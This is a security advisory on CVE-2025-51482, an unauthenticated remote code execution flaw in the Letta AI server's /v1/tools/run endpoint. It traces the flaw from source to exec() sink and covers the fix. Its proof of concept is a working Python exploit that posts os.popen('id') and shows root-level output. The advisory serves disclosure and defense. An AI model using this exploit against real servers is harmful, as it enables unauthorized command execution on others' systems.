# Remote Code Execution (RCE) in Letta AI's `/v1/tools/run`(CVE-2025-51482)

**Initially Found by: Gecko Security (credited on GitHub Pull Request)**

**Affected version: <0.7.12**


## 1\. Vulnerability Overview

A critical **Remote Code Execution (RCE)** vulnerability, identified as **CVE-2025-51482**, was discovered in **Letta application version 0.7.12**. This flaw specifically affects its `/v1/tools/run` API endpoint. The vulnerability allowed remote attackers to execute arbitrary Python code and system commands on the host server running the Letta application.

The core issue stems from the endpoint's design, which accepts user-controlled Python source code and environment variables and then executes this code using Python's built-in `exec()` function within a sandboxed environment. Despite attempts at sandboxing, the application failed to properly restrict access to dangerous modules and system functionality. This oversight meant that if the Letta container was running with elevated privileges (e.g., as root), the attacker could achieve root-level code execution.

The severity of this vulnerability was compounded by two critical factors:

1.  The `/v1/tools/run` endpoint was **accessible without any authentication**.
2.  In local sandbox deployments, this endpoint was **exposed on the network by default**.

This combination presented a severe risk, enabling unauthorized individuals to potentially achieve full system compromise.

-----

## 2\. Root Cause Analysis (Source-Sink Analysis)

The RCE vulnerability in Letta 0.7.12 originates from an improper control of code generation and execution, allowing user-supplied input to directly influence code execution in a poorly contained environment. The flow of the vulnerability can be traced through the following source-sink analysis:

  * **1. Source:**

      * **Function:** `run_tool_from_source`
      * **File Path:** `letta/server/rest_api/routers/v1/tools.py`
      * **Description:** This function serves as the initial entry point, accepting user-controlled `source_code` and `env_vars` via a POST request to the `/v1/tools/run` endpoint.

  * **2. Intermediate (Execution Routing):**

      * **Function:** `ToolExecutionSandbox.run`
      * **File Path:** `letta/services/tool_executor/tool_execution_sandbox.py`
      * **Description:** This method acts as an intermediary, routing the execution of the user-provided code to either a local sandbox or an external (e2b) sandbox environment. The vulnerability specifically lies in the local sandbox path.

  * **3. Intermediate (Sandbox Preparation):**

      * **Function:** `ToolExecutionSandbox.run_local_dir_sandbox`
      * **File Path:** `letta/services/tool_executor/tool_execution_sandbox.py`
      * **Description:** This function is responsible for preparing the local sandbox environment before the actual code execution. Crucially, at this stage, the existing sandbox mechanisms were insufficient to adequately restrict dangerous operations.

  * **4. Sink (Code Execution):**

      * **Function:** `ToolExecutionSandbox.run_local_dir_sandbox_directly`
      * **File Path:** `letta/services/tool_executor/tool_execution_sandbox.py`
      * **Description:** This is the ultimate sink where the user-controlled code is executed directly using Python's built-in `exec()` function. The lack of robust input sanitization and an ineffective sandbox allowed malicious payloads to break out and execute arbitrary system commands.

The primary flaw was the reliance on an `exec()`-based sandbox that failed to properly restrict access to critical Python modules (like `os` and `subprocess`) and built-in functions that could be used for system interaction. Since the endpoint also lacked authentication and was exposed by default in local deployments, it became an easily exploitable target.

-----

## 3\. Proof of Concept (PoC)

The vulnerability can be exploited by sending an unauthenticated POST request to the `/v1/tools/run` endpoint with a JSON payload containing specially crafted malicious Python code. The following Python script demonstrates how to execute the `id` command on the host system, revealing the user under which the Letta server is running (which can be `root` if misconfigured).

**PoC Code:**

```python
import requests
import json

url = "http://localhost:8283/v1/tools/run" # Adjust URL if Letta server is on a different host/port

# Malicious payload that executes the 'id' command
payload = {
    "source_code": "def test():\n    \"\"\"Test function to execute system commands.\"\"\"\n    import os\n    return os.popen('id').read()",
    "args": {},
    "env_vars": {"PYTHONPATH":"/usr/lib/python3/dist-packages"},
    "name": "test"
}

headers = {
    "Content-Type": "application/json"
}

response = requests.post(url, json=payload, headers=headers)

print("Status code:", response.status_code)
print("Response:")
print(json.dumps(response.json(), indent=2))
```

**Response Showing Successful Execution (Example):**

The successful execution of the `id` command would result in a response similar to this, indicating that the command was run and its output returned:

```json
{
  "id": "null",
  "date": "2025-05-13T15:45:30+00:00",
  "name": null,
  "message_type": "tool_return_message",
  "otid": null,
  "sender_id": null,
  "step_id": null,
  "tool_return": "uid=0(root) gid=0(root) groups=0(root)\n",
  "status": "success",
  "tool_call_id": "null",
  "stdout": [],
  "stderr": []
}
```

This response confirms that arbitrary code (in this case, `os.popen('id').read()`) was successfully executed on the server, potentially with root privileges (`uid=0(root)`), demonstrating the severity of the RCE.

-----

## 4\. Mitigation and Remediation

The security fix implemented for this vulnerability (`pull/2630`, `commit 2fb160cd543c4a1ef5338bfc8b6686cd5d50aec5`) significantly strengthened the sandboxing of Python code execution within the `/v1/tools/run` endpoint.

**Key Remediation Steps Implemented:**

1.  **Shift from Module Restriction to Function Blocking:** The remediation moved away from broadly restricting entire modules. Instead, it was refined to specifically **block dangerous functions** (e.g., those allowing system command execution). This allows legitimate functionalities (like `os.getenv` for environment variable access or `requests` for network calls) to continue working, while still effectively preventing RCE.
2.  **Introduction of `RESTRICTEDPYTHON_LOCAL_ENABLED`:** A new environment variable, `RESTRICTEDPYTHON_LOCAL_ENABLED`, was introduced. When this flag is set to `True`, it triggers the use of `RestrictedPython` during code execution. This library is specifically designed to remove dangerous built-ins and disable risky methods from modules like `os` and `subprocess`, providing a more balanced approach between security and necessary functionality.


## 8\. Resources

  * **Official CVE Details:** [https://nvd.nist.gov/vuln/detail/CVE-2025-51482](https://nvd.nist.gov/vuln/detail/CVE-2025-51482)
  * **GitHub Pull Request:** [https://github.com/letta-ai/letta/pull/2630](https://github.com/letta-ai/letta/pull/2630)
  * **GitHub Commit:** [https://github.com/letta-ai/letta/pull/2630/commits/2fb160cd543c4a1ef5338bfc8b6686cd5d50aec5](https://github.com/letta-ai/letta/pull/2630/commits/2fb160cd543c4a1ef5338bfc8b6686cd5d50aec5)
  * Letta GitHub Repository: [https://github.com/letta-ai/letta](https://github.com/letta-ai/letta)
  * Tenable Advisory: [https://www.tenable.com/cve/CVE-2025-51482](https://www.tenable.com/cve/CVE-2025-51482)
